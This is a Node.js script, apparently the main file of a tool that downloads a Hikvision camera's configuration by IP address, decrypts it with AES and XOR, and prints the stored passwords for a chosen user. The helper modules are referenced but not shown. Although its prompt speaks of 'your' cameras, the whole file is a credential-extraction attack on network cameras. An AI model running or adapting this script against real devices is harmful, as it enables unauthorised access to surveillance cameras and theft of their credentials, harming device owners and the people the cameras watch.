const downloadConfig = require("./downloadConfig");
const decryptFile = require("./decryptAes");
const decryptXor = require("./decryptXor");
const findAuth = require("./findAuth");

const ipAddress = process.argv[2];
const username = process.argv[3] || "admin";

if (!ipAddress) {
	console.log("Please provide the IP address of one of your Hikvision cameras!");
	process.exit();
}

downloadConfig(ipAddress).then((filePath) => {
	console.log("Decrypting file...");
	return decryptFile(filePath);
}).then((filePath) => {
	console.log("Decoding file...");
	return decryptXor(filePath);
}).then((filePath) => {
	console.log("Finding passwords...");
	return findAuth(filePath, username);
}).then((resultArr) => {
	console.log(`Passwords Located: ${resultArr.length}`);
	console.log("---------------------------------------------------");
	
	resultArr.forEach((item) => {
		console.log("Username:", username);
		console.log("Password:", item[2]);
		console.log("");
	});
}).catch((err) => {
	console.log("An error occurred", err);
	console.error(err);
});
